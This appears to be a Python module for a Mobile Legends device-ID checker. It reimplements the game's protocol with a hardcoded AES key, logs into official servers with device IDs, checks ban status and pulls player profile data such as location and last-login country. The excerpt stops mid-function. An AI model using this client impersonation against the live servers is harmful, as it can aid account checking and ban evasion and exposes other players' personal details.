"""
MLBB Device ID Checker — Core Module
Ban check method ported from shin.py (fast, same-socket, accurate).
"""
from __future__ import annotations
import datetime, hashlib, logging, os, random, secrets, socket, struct, time, uuid, zlib
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple

try:
    import zstandard as zstd
except ImportError:
    raise SystemExit("pip install zstandard")
try:
    from Crypto.Cipher import AES
except ImportError:
    raise SystemExit("pip install pycryptodome")

# ---------------- Config ----------------
GATEWAYS = [
    ("login.ml.youngjoygame.com", 30021),
    ("119.81.89.84",  30021),
    ("119.81.67.250", 30021),
    ("119.81.63.238", 30021),
    ("161.202.213.238", 30021),
    ("43.247.140.15", 30021),
    ("43.247.140.16", 30021),
]
SERVER_HOST     = "login.ml.youngjoygame.com"
SERVER_PORT     = 30021
CLIENT_VERSION  = os.environ.get("MLBB_CLIENT_VERSION", "2.1.88.1205.1")
CHANNEL_AND     = os.environ.get("MLBB_CHANNEL", "and_usa")
CHANNEL_IOS     = "ios_usa"
LANGUAGE        = os.environ.get("MLBB_LANG", "en")
SOCK_CONNECT    = float(os.environ.get("MLBB_CONNECT_TIMEOUT", "10.0"))
SOCK_READ       = float(os.environ.get("MLBB_SOCK_TIMEOUT",   "12.0"))
LOGIN_TIMEOUT   = float(os.environ.get("MLBB_LOGIN_TIMEOUT",  "20.0"))
LOOKUP_TIMEOUT  = float(os.environ.get("MLBB_LOOKUP_TIMEOUT", "15.0"))
BAN_WAIT        = float(os.environ.get("MLBB_BAN_WAIT",       "20.0"))
BAN_READ_CHUNK  = float(os.environ.get("MLBB_BAN_READ_TIMEOUT","3.0"))
LOGIN_RETRIES   = int(os.environ.get("MLBB_LOGIN_RETRIES",    "5"))
CHECK_RETRIES   = int(os.environ.get("MLBB_CHECK_RETRIES",    "5"))
LOOKUP_RETRIES  = int(os.environ.get("MLBB_LOOKUP_RETRIES",   "6"))
RETRY_BACKOFF   = [1.0, 2.0, 4.0, 6.0, 8.0, 10.0]
RECV_CHUNK      = 8192
DEBUG           = os.environ.get("MLBB_DEBUG", "").lower() in ("1", "true", "yes")
if DEBUG:
    logging.basicConfig(level=logging.DEBUG, format="%(asctime)s %(levelname)s %(message)s")

# ---------------- Login error codes ----------------
LOGIN_BAN_CODES = {3, 4, 5, 6, 100, 101, 102, 103, 104, 105, 200, 201, 202}
LOGIN_ERROR_MEANING: Dict[int, str] = {
    3:"Account banned",4:"Account suspended",5:"Account restricted",6:"Account locked",
    100:"Permanent ban",101:"Temporary ban",102:"Device banned",103:"IP banned",
    104:"Region locked",105:"Account terminated",200:"Cheat detected",
    201:"Abnormal client",202:"Modified APK",
}

BAN_REASON_MAP: Dict[str, str] = {
    # ── modern MLBB codes ──
    "21": "Cheats",
    "22": "Using Plug-in Apps",
    "23": "Unauthorized Game Modifications",
    "24": "Scripts or Automation",
    "25": "Exploiting Game Bugs",
    "26": "Unauthorized Plugins",
    "27": "Using Bots",
    "28": "Matchmaking Manipulation",
    "29": "Intentionally Losing",
    "30": "AFK / Unsportsmanlike",
    "31": "Harassment / Abusive",
    "32": "Hate Speech",
    "33": "Threats / Inappropriate",
    "34": "Impersonation",
    "35": "Scamming / Fraud",
    "36": "Phishing",
    "37": "Malicious Links",
    "38": "Inappropriate Username",
    "39": "Inappropriate Profile",
    "40": "Account Sharing / Selling",
    "41": "Fraudulent Payment",
    "42": "Chargeback / Payment Abuse",
    "43": "Refund Abuse",
    "44": "Circumventing Ban",
    "45": "Security Vulnerability",
    "46": "Repeated TOS Violations",
    "47": "Code of Conduct Violation",
    "48": "Fair Play Violation",
    "49": "Game Security Violation",
    # ── legacy fallbacks ──
    "1": "Cheating / Hack tools",
    "2": "Modified game client",
    "3": "Third-party software",
    "4": "Auto-clicker / Bot usage",
    "5": "Bug / Exploit abuse",
    "10": "Account sharing",
    "12": "Suspicious login activity",
    "13": "Rank boosting / manipulation",
    "14": "Match result manipulation",
    "60": "Ban evasion",
    "99": "Multiple violations",
    "100": "Permanent ban — Severe violations",
}

def translate_ban_reason(raw) -> str:
    if raw is None or raw == "": return "Unspecified"
    key = str(raw).strip()
    if key in BAN_REASON_MAP: return BAN_REASON_MAP[key]
    try:
        r = int(raw)
    except (ValueError, TypeError):
        return key
    return BAN_REASON_MAP.get(str(r), f"Violation code {r}")

# ---------------- Hero map ----------------
HERO_ID_MAP: Dict[int, str] = {
    1:"Miya",2:"Balmond",3:"Saber",4:"Alice",5:"Nana",6:"Tigreal",7:"Alucard",8:"Karina",
    9:"Akai",10:"Franco",11:"Bane",12:"Bruno",13:"Clint",14:"Rafaela",15:"Eudora",16:"Zilong",
    17:"Fanny",18:"Layla",19:"Minotaur",20:"Lolita",21:"Hayabusa",22:"Freya",23:"Gord",24:"Natalia",
    25:"Kagura",26:"Chou",27:"Sun",28:"Alpha",29:"Ruby",30:"Yi Sun-shin",31:"Moskov",32:"Johnson",
    33:"Cyclops",34:"Estes",35:"Hilda",36:"Aurora",37:"Lapu-Lapu",38:"Vexana",39:"Roger",40:"Karrie",
    41:"Gatotkaca",42:"Harley",43:"Irithel",44:"Grock",45:"Argus",46:"Odette",47:"Lancelot",48:"Diggie",
    49:"Hylos",50:"Zhask",51:"Helcurt",52:"Pharsa",53:"Lesley",54:"Jawhead",55:"Angela",56:"Gusion",
    57:"Valir",58:"Martis",59:"Uranus",60:"Hanabi",61:"Chang'e",62:"Kaja",63:"Selena",64:"Aldous",
    65:"Claude",66:"Vale",67:"Leomord",68:"Lunox",69:"Hanzo",70:"Belerick",71:"Kimmy",72:"Thamuz",
    73:"Harith",74:"Minsitthar",75:"Kadita",76:"Faramis",77:"Badang",78:"Khufra",79:"Granger",
    80:"Guinevere",81:"Esmeralda",82:"Terizla",83:"X.Borg",84:"Ling",85:"Dyrroth",86:"Lylia",87:"Baxia",
    88:"Masha",89:"Wanwan",90:"Silvanna",91:"Cecilion",92:"Carmilla",93:"Atlas",94:"Popol and Kupa",
    95:"Yu Zhong",96:"Luo Yi",97:"Benedetta",98:"Khaleed",99:"Barats",100:"Brody",101:"Yve",
    102:"Mathilda",103:"Paquito",104:"Gloo",105:"Beatrix",106:"Phoveus",107:"Natan",108:"Aulus",
    109:"Aamon",110:"Valentina",111:"Edith",112:"Floryn",113:"Yin",114:"Melissa",115:"Xavier",
    116:"Julian",117:"Fredrinn",118:"Joy",119:"Novaria",120:"Arlott",121:"Ixia",122:"Nolan",
    123:"Cici",124:"Chip",125:"Zhuxin",126:"Suyou",127:"Lukas",128:"Kalea",129:"Zetian",130:"Obsidia"
}
def hero_name(hid) -> str:
    try: return HERO_ID_MAP.get(int(hid), f"Unknown({hid})")
    except Exception: return f"Unknown({hid})"

RANK_DEFS = [
    (0,4,"Warrior III"),(5,9,"Warrior II"),(10,14,"Warrior I"),
    (15,19,"Elite IV"),(20,24,"Elite III"),(25,29,"Elite II"),(30,34,"Elite I"),
    (35,39,"Master IV"),(40,44,"Master III"),(45,49,"Master II"),(50,54,"Master I"),
    (55,59,"Grandmaster IV"),(60,64,"Grandmaster III"),(65,69,"Grandmaster II"),(70,74,"Grandmaster I"),
    (75,81,"Epic IV"),(82,88,"Epic III"),(89,95,"Epic II"),(96,107,"Epic I"),
    (108,114,"Legend IV"),(115,121,"Legend III"),(122,128,"Legend II"),(129,135,"Legend I"),
    (136,160,lambda p: f"Mythic {p-135}"),
    (161,195,lambda p: f"Mythical Honor {p-135}"),
    (196,235,lambda p: f"Mythical Glory {p-157}"),
    (236,9999,lambda p: f"Mythical Immortal {p-157}"),
]
def map_rank(p) -> str:
    try: p = int(p)
    except Exception: return "Unranked"
    if p < 0: return "Unranked"
    for mn, mx, r in RANK_DEFS:
        if mn <= p <= mx: return r(p) if callable(r) else r
    return "Unranked"

def map_collector_point(point) -> str:
    if not point or not isinstance(point, (int, float)): return "No Tier"
    point = int(point)
    if point < 1000: return "No Tier"
    tiers = [(1000,4000,"Amateur Collector"),(4000,10000,"Junior Collector"),
             (10000,22000,"Seasoned Collector"),(22000,44000,"Expert Collector"),
             (44000,84000,"Renowned Collector"),(84000,160000,"Exalted Collector"),
             (160000,280000,"Mega Collector"),(280000,float("inf"),"World Collector")]
    for mn, mx, name in tiers:
        if mn <= point < mx:
            if name == "World Collector": return "World Collector"
            per = (mx - mn) / 5
            lvl = max(0, min(4, int((point - mn) // per)))
            return f"{name} {['V','IV','III','II','I'][lvl]}"
    return "Unknown"

AFFINITY_MAP = {0:"None",1:"Bronze",2:"Silver",3:"Gold",4:"Platinum",5:"Diamond"}
EMBLEM_MAP = {1:"Fighter",2:"Assassin",3:"Mage",4:"Marksman",5:"Support",6:"Tank",7:"Common"}

def fmt_ts(ts) -> str:
    if not ts: return "N/A"
    try:
        utc = datetime.datetime.fromtimestamp(int(ts), tz=datetime.timezone.utc)
        return (utc + datetime.timedelta(hours=8)).strftime("%Y-%m-%d %H:%M")
    except Exception: return "N/A"

def fmt_ts_full(ts) -> str:
    if not ts: return "N/A"
    try:
        utc = datetime.datetime.fromtimestamp(int(ts), tz=datetime.timezone.utc)
        return (utc + datetime.timedelta(hours=8)).strftime("%Y-%m-%d %H:%M:%S")
    except Exception: return "N/A"

def is_guest_account(acc) -> bool:
    if acc is None: return False
    s = str(acc).strip()
    return s.startswith("221") or s.startswith("222")

AES_KEY = bytes.fromhex("f5a193d50ade553e9835595f5cd75ddd")
AES_IV  = b"\x00" * 16

# ---------------- SDP ----------------
class SdpDataType(Enum):
    INTEGER_POSITIVE=0; INTEGER_NEGATIVE=1; FLOAT=2; DOUBLE=3
    STRING=4; LIST=5; DICT=6; STRUCT_BEGIN=7; STRUCT_END=8

class SdpStruct(dict):
    def __init__(self, data=None):
        super().__init__(); self.data = b""; self.offset = 0
        if isinstance(data, bytes): self.data = data; self._unpack()
        elif data is not None: self.update(data); self._pack()
    def _pack(self):
        self.data = bytes([SdpDataType.STRUCT_BEGIN.value << 4])
        for k, v in sorted(self.items()): self._pack_item(k, v)
        self.data += bytes([SdpDataType.STRUCT_END.value << 4])
    def _unpack(self):
        if not self.data: return
        if self.data[0] >> 4 == SdpDataType.STRUCT_BEGIN.value: self.offset = 1
        while self.offset < len(self.data):
            k, v = self._unpack_item()
            if isinstance(v, SdpDataType) and v == SdpDataType.STRUCT_END: break
            self[k] = v
    def _wv(self, n):
        r = bytearray()
        while n >= 0x80: r.append((n & 0x7F) | 0x80); n >>= 7
        r.append(n & 0x7F); return bytes(r)
    def _rv(self):
        n = 1; val = self.data[self.offset] & 0x7F
        while self.data[self.offset + n - 1] >= 0x80:
            val |= (self.data[self.offset + n] & 0x7F) << (7 * n); n += 1
        self.offset += n; return val
    def _ph(self, tag, dt):
        if tag < 15: self.data += bytes([(dt.value << 4) | tag])
        else: self.data += bytes([(dt.value << 4) | 15]) + self._wv(tag)
    def _pack_item(self, tag, val):
        if isinstance(val, bool):
            self._ph(tag, SdpDataType.INTEGER_POSITIVE); self.data += self._wv(1 if val else 0)
        elif isinstance(val, int):
            if val < 0: self._ph(tag, SdpDataType.INTEGER_NEGATIVE); self.data += self._wv(-val)
            else: self._ph(tag, SdpDataType.INTEGER_POSITIVE); self.data += self._wv(val)
        elif isinstance(val, float):
            self._ph(tag, SdpDataType.DOUBLE); self.data += self._wv(8) + struct.pack("<d", val)
        elif isinstance(val, (str, bytes)):
            self._ph(tag, SdpDataType.STRING)
            enc = val.encode("utf-8") if isinstance(val, str) else val
            self.data += self._wv(len(enc)) + enc
        elif isinstance(val, list):
            self._ph(tag, SdpDataType.LIST); self.data += self._wv(len(val))
            for it in val: self._pack_item(0, it)
        elif isinstance(val, dict):
            if isinstance(val, SdpStruct):
                self._ph(tag, SdpDataType.STRUCT_BEGIN)
                for k, v in sorted(val.items()): self._pack_item(k, v)
                self.data += bytes([SdpDataType.STRUCT_END.value << 4])
            else:
                self._ph(tag, SdpDataType.DICT); self.data += self._wv(len(val))
                for k, v in sorted(val.items()): self._pack_item(0, k); self._pack_item(0, v)
        else: raise Exception(f"Unsupported type: {type(val)}")
    def _unpack_item(self):
        if self.offset >= len(self.data): return 0, None
        hdr = self.data[self.offset]; tag = hdr & 0xF; dt = SdpDataType(hdr >> 4); self.offset += 1
        if tag == 15: tag = self._rv()
        if dt == SdpDataType.INTEGER_POSITIVE: return tag, self._rv()
        if dt == SdpDataType.INTEGER_NEGATIVE: return tag, -self._rv()
        if dt == SdpDataType.FLOAT: return tag, struct.unpack("<f", self._rv().to_bytes(4,"little"))[0]
        if dt == SdpDataType.DOUBLE: return tag, struct.unpack("<d", self._rv().to_bytes(8,"little"))[0]
        if dt == SdpDataType.STRING:
            l = self._rv(); raw = self.data[self.offset:self.offset+l]; self.offset += l
            try: return tag, raw.decode("utf-8")
            except Exception: return tag, raw
        if dt == SdpDataType.LIST:
            l = self._rv(); return tag, [self._unpack_item()[1] for _ in range(l)]
        if dt == SdpDataType.DICT:
            l = self._rv(); res = {}
            for _ in range(l):
                _, k = self._unpack_item(); _, v = self._unpack_item(); res[k] = v
            return tag, res
        if dt == SdpDataType.STRUCT_BEGIN:
            res = {}
            while True:
                k, v = self._unpack_item()
                if isinstance(v, SdpDataType) and v == SdpDataType.STRUCT_END: break
                res[k] = v
            return tag, SdpStruct(res)
        if dt == SdpDataType.STRUCT_END: return tag, SdpDataType.STRUCT_END
        raise Exception("Unknown data type")

# ---------------- Device ID ----------------
def detect_platform(did: str) -> str:
    return "ios" if str(did or "").strip().lower().startswith("ios_") else "and"

def parse_device_id(device_id: str) -> Dict[str, Any]:
    raw = (device_id or "").strip()
    platform = detect_platform(raw)
    if platform == "and":
        clean = raw[4:].replace("-", "")
        imei = clean[:32] if len(clean) >= 32 else clean
        android = clean[32:48] if len(clean) >= 48 else ""
        adid = clean[48:] if len(clean) > 48 else ""
        return {"platform":"and","imei":imei,"android":android,"adid":adid,
                "channel":CHANNEL_AND,
                "auth_str": f"gps_adid={adid}&android_id={android}&device_unique_id={imei}"}
    body = raw[4:] if raw[:4].lower() == "ios_" else raw
    imei = body[:32] if len(body) >= 32 else body
    android = body[32:48] if len(body) >= 48 else ""
    adid = body[48:] if len(body) > 48 else ""
    return {"platform":"ios","imei":imei,"android":android,"adid":adid,
            "channel":CHANNEL_IOS,
            "auth_str": f"idfa={adid}&idfv={android}&device_unique_id={imei}"}

def validate_device_id(did: str) -> Tuple[bool, str]:
    if not isinstance(did, str): return False, "Not a string"
    did = did.strip()
    if not did: return False, "Empty"
    if not did.startswith(("and_", "ios_")): return False, "Missing and_/ios_ prefix"
    body = did[4:]
    if len(body) < 20: return False, f"Body too short ({len(body)})"
    return True, "OK"

# ---------------- Connection ----------------
class BaseConnection:
    def __init__(self, host, port, stop_event=None):
        self.host = host; self.port = port; self.sequence = 1
        self.socket = None; self.queue = b""
        self.stop_event = stop_event; self.aborted = False
    def _should_abort(self):
        return self.stop_event is not None and self.stop_event.is_set()
    def connect(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try: self.socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        except Exception: pass
        self.socket.settimeout(SOCK_CONNECT)
        self.socket.connect((self.host, self.port))
        self.socket.settimeout(SOCK_READ)
    def cleanup(self):
        if self.socket:
            try: self.socket.close()
            except Exception: pass
            self.socket = None; self.sequence = 1; self.queue = b""
    def send_data(self, pid, sdp: SdpStruct):
        if self._should_abort():
            self.aborted = True; raise ConnectionError("aborted")
        pkt = SdpStruct({0: pid, 1: self.sequence, 5: sdp.data}).data
        comp = zstd.compress(pkt)
        flags = (len(comp) + 4) | (16 << 24)
        self.socket.sendall(flags.to_bytes(4, "big") + comp); self.sequence += 1
    def recv_data(self):
        if self._should_abort():
            self.aborted = True; return None, None
        try:
            while len(self.queue) < 4:
                d = self.socket.recv(RECV_CHUNK)
                if not d: return None, None
                self.queue += d
            flags = int.from_bytes(self.queue[:4], "big")
            size = flags & 0xFFFFFF; ctype = flags >> 24
            if size < 4 or size > 10_000_000: return None, None
            while len(self.queue) < size:
                if self._should_abort():
                    self.aborted = True; return None, None
                d = self.socket.recv(RECV_CHUNK)
                if not d: return None, None
                self.queue += d
            data = self.queue[4:size]; self.queue = self.queue[size:]
            if ctype == 1: data = zlib.decompress(data)
            elif ctype == 16: data = zstd.decompress(data)
            elif ctype in (2, 3, 18):
                c = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
                data = c.decrypt(data[:-1] if len(data) % 16 else data).rstrip(b"\x00")
                if ctype == 3: data = zlib.decompress(data)
                elif ctype == 18: data = zstd.decompress(data)
            res = SdpStruct(data); pid = res.get(0)
            if pid is None: return None, None
            body = res.get(6) or res.get(5)
            if body and isinstance(body, bytes):
                try: return pid, SdpStruct(body)
                except Exception: return pid, None
            return pid, None
        except socket.timeout: return -1, None
        except ConnectionError:
            self.aborted = True; return None, None
        except Exception: return None, None


class GameConnection(BaseConnection):
    def __init__(self, device_id, stop_event=None):
        super().__init__(SERVER_HOST, SERVER_PORT, stop_event)
        self.device_id = device_id
        p = parse_device_id(device_id)
        self.platform = p["platform"]; self.imei = p["imei"]
        self.android = p["android"]; self.adid = p["adid"]
        self.channel = p["channel"]; self.auth_str = p["auth_str"]
        self.account_id = 0; self.session_key = ""; self.zone_id = 0
        self.game_host = ""; self.game_port = 0
        self.creation_ts = 0
        self.is_guest = False
        self.login_error_code = 0
        self.login_ban_end_ts = 0
        self.login_ban_reason = 0
        self.login_ban_type = 0
        self.login_ban_flag = False

    @staticmethod
    def _coerce_zone(z) -> int:
        if z is None: return 0
        if isinstance(z, bool): return int(z)
        if isinstance(z, int): return z
        if isinstance(z, (list, tuple)): return GameConnection._coerce_zone(z[0]) if z else 0
        if isinstance(z, dict):
            for k in (0, 1, "0", "id", "zone", "zone_id"):
                if k in z: return GameConnection._coerce_zone(z[k])
            if z: return GameConnection._coerce_zone(next(iter(z.values())))
        try: return int(z)
        except Exception: return 0

    @staticmethod
    def _parse_hostport(raw):
        if raw is None: return None, None
        if isinstance(raw, bytes): raw = raw.decode("utf-8", errors="ignore")
        if isinstance(raw, str):
            if ":" not in raw: return None, None
            host, port = raw.rsplit(":", 1)
            try: return host.strip(), int(port.strip())
            except Exception: return None, None
        if isinstance(raw, dict):
            for v in raw.values():
                if isinstance(v, str) and ":" in v:
                    return GameConnection._parse_hostport(v)
            h = raw.get(1) or raw.get("host") or raw.get("ip") or raw.get(0)
            p = raw.get(2) or raw.get("port")
            if h and p:
                try: return str(h).strip(), int(p)
                except Exception: pass
            vals = list(raw.values())
            if len(vals) >= 2:
                try: return str(vals[0]).strip(), int(vals[1])
                except Exception: pass
        if isinstance(raw, (list, tuple)) and len(raw) >= 2:
            try: return str(raw[0]).strip(), int(raw[1])
            except Exception: pass
        return None, None

    def login_to_login_server(self) -> bool:
        if not self.socket or self.host != SERVER_HOST:
            self.cleanup(); self.host, self.port = SERVER_HOST, SERVER_PORT
            self.connect()
        self.send_data(1, SdpStruct({
            0: self.device_id, 1: self.auth_str,
            2: CLIENT_VERSION, 3: self.channel, 4: LANGUAGE}))
        for _ in range(LOGIN_RETRIES):
            if self._should_abort(): return False
            try: self.socket.settimeout(LOGIN_TIMEOUT)
            except Exception: pass
            pid, res = self.recv_data()
            try: self.socket.settimeout(SOCK_READ)
            except Exception: pass
            if self.aborted: return False
            if pid in (-1, None): continue
            if pid == 2 and res:
                acc = res.get(0)
                if is_guest_account(acc):
                    self.is_guest = True; return False
                self.account_id = acc
                self.session_key = res.get(1) or ""
                self.zone_id = self._coerce_zone(res.get(2))
                self.creation_ts = res.get(19, 0)
                self.login_error_code = int(res.get(10, 0) or 0)
                self.login_ban_end_ts = self._first_ts(res.get(20, 0), res.get(24, 0), res.get(26, 0))
                self.login_ban_reason = self._first_int(res.get(21, 0), res.get(23, 0), res.get(25, 0))
                self.login_ban_type = self._first_int(res.get(22, 0), res.get(31, 0))
                self.login_ban_flag = self.login_error_code in LOGIN_BAN_CODES
                return True
        return False

    @staticmethod
    def _first_ts(*vals):
        for v in vals:
            if isinstance(v, bool): continue
            if isinstance(v, int) and v > 1_000_000_000: return v
        return 0

    @staticmethod
    def _first_int(*vals):
        for v in vals:
            if isinstance(v, bool): continue
            if isinstance(v, int) and v > 0: return v
        return 0

    def get_game_server(self) -> bool:
        for _ in range(4):
            if self._should_abort(): return False
            try:
                self.send_data(5, SdpStruct({0: self.account_id, 1: self.session_key,
                    2: CLIENT_VERSION, 5: self.zone_id, 6: self.channel}))
                for _ in range(10):
                    if self._should_abort(): return False
                    pid, res = self.recv_data()
                    if self.aborted: return False
                    if pid in (-1, None): break
                    if pid == 6 and res:
                        host, port = self._parse_hostport(res.get(1))
                        if host and port:
                            self.game_host = host; self.game_port = int(port); return True
                        if isinstance(res, dict):
                            for v in res.values():
                                h, p = self._parse_hostport(v)
                                if h and p:
                                    self.game_host = h; self.game_port = p; return True
            except ConnectionError: return False
            except Exception: pass
            time.sleep(0.4)
        return False

    def connect_to_game_server(self) -> bool:
        self.cleanup(); self.host, self.port = self.game_host, self.game_port
        try: self.connect()
        except Exception: return False
        try:
            self.send_data(10001, SdpStruct({0: self.account_id, 1: self.session_key,
                2: self.zone_id, 4: CLIENT_VERSION, 13: self.channel, 15: self.device_id}))
        except ConnectionError: return False
        for _ in range(20):
            if self._should_abort(): return False
            pid, _ = self.recv_data()
            if self.aborted: return False
            if pid is None or pid == -1: return False
            if pid == 10002: return True
            if pid == 20001: continue
        return False

    def lookup_player(self, search_value) -> Optional[SdpStruct]:
        for _ in range(LOOKUP_RETRIES):
            if self._should_abort(): return None
            try: self.send_data(11153, SdpStruct({1: int(search_value)}))
            except ConnectionError: return None
            except Exception: break
            for _ in range(16):
                if self._should_abort(): return None
                pid, res = self.recv_data()
                if self.aborted: return None
                if pid == 11154: return res
                if pid in (-1, None): break
                if pid == 20001: continue
            time.sleep(0.5)
        return None

    # ══════════════════════════════════════════════════════════
    # PORTED FROM shin.py — same-socket, drain-queue, 20001/20002
    # ══════════════════════════════════════════════════════════
    def _drain_queue(self):
        """Clear stale packets (up to 20 reads with 0.2s timeout each)."""
        try: self.socket.settimeout(0.2)
        except Exception: return
        try:
            for _ in range(20):
                try: pid, _ = self.recv_data()
                except Exception: break
                if pid in (-1, None): break
        finally:
            try: self.socket.settimeout(SOCK_READ)
            except Exception: pass

    def check_ban_status(self) -> Dict[str, Any]:
        """
        shin.py method:
          1. Reject guests upfront
          2. Drain stale packets
          3. Send 10101 {0:0, 2:2} on EXISTING game-server socket (no reconnect)
          4. Read up to BAN_WAIT seconds:
               - 20002 → Not Banned (definitive)
               - 20001 + reason + non-zero remaining time → BANNED
               - 20001 without those fields → Not Banned
               - no response → UNKNOWN
        """
        if self.is_guest or is_guest_account(self.account_id):
            return {"banned": False, "state": "unregistered", "reason": "",
                    "remaining": "", "label": "UNREGISTERED"}

        self._drain_queue()

        try:
            self.send_data(10101, SdpStruct({0: 0, 2: 2}))
        except ConnectionError as e:
            return {"banned": False, "state": "unknown", "reason": "",
                    "remaining": "", "label": f"Send failed: {e}"}

        deadline = time.time() + BAN_WAIT
        old_timeout = None
        try:
            old_timeout = self.socket.gettimeout()
        except Exception: pass

        try:
            for _ in range(8):
                if self._should_abort():
                    return {"banned": False, "state": "unknown", "label": "aborted"}

                remaining_budget = deadline - time.time()
                if remaining_budget <= 0:
                    break

                # Short per-read timeout so we can bail at the deadline
                try:
                    self.socket.settimeout(min(BAN_READ_CHUNK, remaining_budget))
                except Exception: pass

                pid, res = self.recv_data()

                if self.aborted:
                    return {"banned": False, "state": "unknown", "label": "aborted"}

                # Server closed the connection
                if pid is None:
                    break

                # Socket read timeout — keep trying until deadline
                if pid == -1:
                    continue

                # Definitive "clean" signal
                if pid == 20002:
                    return {"banned": False, "state": "clear", "reason": "",
                            "remaining": "", "label": "Not Banned"}

                # Ban info packet
                if (pid == 20001 and res and isinstance(res, dict)
                        and 0 in res and isinstance(res[0], dict)):
                    b = res[0]
                    raw_reason = b.get("ban_reason", "")
                    d = str(b.get("endtime_day", "0") or "0")
                    h = str(b.get("endtime_hour", "0") or "0")
                    m = str(b.get("endtime_min", "0") or "0")
                    s = str(b.get("endtime_sec", "0") or "0")
                    try:
                        total_ban_seconds = (int(d) * 86400 + int(h) * 3600
                                              + int(m) * 60 + int(s))
                    except Exception:
                        total_ban_seconds = 0

                    # shin.py: BOTH reason AND non-zero remaining time required
                    if raw_reason and str(raw_reason).strip() and total_ban_seconds > 0:
                        friendly = translate_ban_reason(raw_reason)
                        remaining = f"{d}d {h}h {m}m {s}s"
                        return {
                            "banned": True,
                            "state": "banned",
                            "reason": friendly,
                            "reason_raw": raw_reason,
                            "remaining": remaining,
                            "label": (f"Banned | Reason: {friendly} "
                                      f"(code {raw_reason}) | Duration: {remaining}"),
                        }
                    # 20001 without ban fields → treat as clean
                    return {"banned": False, "state": "clear", "reason": "",
                            "remaining": "", "label": "Not Banned"}

                # Any other packet — ignore and keep reading
                continue

        finally:
            if old_timeout is not None:
                try: self.socket.settimeout(old_timeout)
                except Exception: pass

        # No 20001 and no 20002 within budget → UNKNOWN
        return {"banned": False, "state": "unknown", "reason": "",
                "remaining": "",
                "label": f"No 20001/20002 within {int(BAN_WAIT)}s"}


def _setup_connection(device_id: str) -> GameConnection:
    conn = GameConnection(device_id)
    try: conn.connect()
    except Exception as e:
        raise ConnectionError(f"Cannot reach login server: {e}")
    if not conn.login_to_login_server():
        if conn.is_guest:
            raise ConnectionError("Guest / unregistered device")
        raise ConnectionError("Login failed")
    if not conn.get_game_server():
        raise ConnectionError("Server resolve failed")
    if not conn.connect_to_game_server():
        raise ConnectionError("Handshake failed")
    return conn

# ---------------- Extract ----------------
def _parse_skin_breakdown(tag118) -> Dict[str, int]:
    out = {"Supreme Skins":0,"Grand Skins":0,"Exquisite Skins":0,
           "Deluxe Skins":0,"Exceptional Skins":0,"Common Skins":0}
    if not tag118 or not isinstance(tag118, dict): return out
    inner = tag118.get(4) or tag118.get("4") or {}
    if not isinstance(inner, dict): return out
    labels = {6:"Supreme Skins",5:"Grand Skins",4:"Exquisite Skins",
              3:"Deluxe Skins",2:"Exceptional Skins",1:"Common Skins"}
    for k, v in inner.items():
        try: kk = int(k)
        except Exception: continue
        if kk in labels:
            try: out[labels[kk]] = int(v)
            except Exception: pass
    return out

def extract_player_data(result, role_info=None, creation_ts=0, v2l_data=None) -> Optional[Dict[str, Any]]:
    if not result or 0 not in result: return None
    plist = result.get(0)
    if not isinstance(plist, list) or not plist: return None
    pd = plist[0]
    if not isinstance(pd, dict): return None
    if is_guest_account(pd.get(0)): return None
    try:
        nickname    = pd.get(2, "Unknown")
        player_id   = pd.get(0, "Unknown")
        server      = pd.get(1, "Unknown")
        level       = pd.get(3, "Unknown")
        skin_count  = int(pd.get(83, 0) or 0)
        hero_count  = int(pd.get(4, 0) or 0)
        total_battles = int(pd.get(17, 0) or 0)
        rating_score = pd.get(9, 0)
        achievement_points = pd.get(7, 0)
        if role_info and isinstance(role_info, dict):
            hero_count   = int(role_info.get(9, hero_count) or hero_count)
            total_battles = int(role_info.get(22, total_battles) or total_battles)
        location = None
        ld = pd.get(71)
        if isinstance(ld, list) and len(ld) >= 2: location = ", ".join(str(x) for x in ld)
        last_login_ts = pd.get(5, 0)
        last_login = fmt_ts(last_login_ts)
        last_login_country = str(pd.get(87)) if pd.get(87) else None
        create_country = str(pd.get(97)) if pd.get(97) else None
        sn = str(pd.get(30, "")).replace("`", "").strip()
        si = str(pd.get(31, "")).strip()
        squad = f"{si} {sn}".strip() if sn else None
        squad_id = 0
        if role_info and isinstance(role_info, dict): squad_id = role_info.get(34, 0)
        if not squad_id: squad_id = pd.get(34, pd.get(28, 0))
        hr = map_rank(pd.get(95)) if pd.get(95) is not None else "Unknown"
        cr = map_rank(pd.get(8)) if pd.get(8) is not None else "Unknown"
        tag136 = pd.get(136, {})
        cpt = int(tag136.get(9, 0) or 0) if isinstance(tag136, dict) else 0
        ctier = map_collector_point(cpt)
        tag118 = None
        if role_info and isinstance(role_info, dict): tag118 = role_info.get(118)
        if not tag118: tag118 = pd.get(118)
        skin_breakdown = _parse_skin_breakdown(tag118)
        tag135 = pd.get(135, {})
        aff_lv = tag135.get(1, 0) if isinstance(tag135, dict) else 0
        affinity = AFFINITY_MAP.get(aff_lv, f"Level {aff_lv}") if aff_lv else "None"
        latest_skin_ts = pd.get(176, 0)
        latest_skin_date = fmt_ts(latest_skin_ts) if latest_skin_ts else "N/A"
        latest_skin_id = pd.get(175, 0)
        sl_expiry = 0
        for t in (21, 47, 50):
            if role_info and isinstance(role_info, dict):
                v = role_info.get(t, 0) or 0
                if isinstance(v, int) and v > 1700000000: sl_expiry = v; break
        if not sl_expiry:
            for t in (21, 47, 50):
                v = pd.get(t, 0) or 0
                if isinstance(v, int) and v > 1700000000: sl_expiry = v; break
        if sl_expiry:
            starlight_user = "Yes ⭐" if sl_expiry > time.time() else "No"
            starlight_expiry = fmt_ts(sl_expiry)
        else:
            starlight_user = "No"; starlight_expiry = "N/A"
        starlight_months = pd.get(60, 0)
        likes = 0
        if role_info and isinstance(role_info, dict): likes = role_info.get(24, 0)
        if not likes: likes = pd.get(61, 0)
        followers = 0
        if role_info and isinstance(role_info, dict): followers = role_info.get(23, 0)
        if not followers: followers = pd.get(15, 0)
        popularity = pd.get(14, 0)
        bio = pd.get(24, "").strip() if isinstance(pd.get(24), str) else None
        credits = None
        if role_info and isinstance(role_info, dict):
            cs = role_info.get(20, 0)
            if isinstance(cs, int) and cs > 0: credits = f"{cs}/110"
        if not credits:
            cs = pd.get(80, 0)
            if isinstance(cs, int) and cs > 0: credits = f"{cs}/110"
        restriction_flags = "None"
        t117 = None
        if role_info and isinstance(role_info, dict): t117 = role_info.get(117)
        if t117 is None: t117 = pd.get(117)
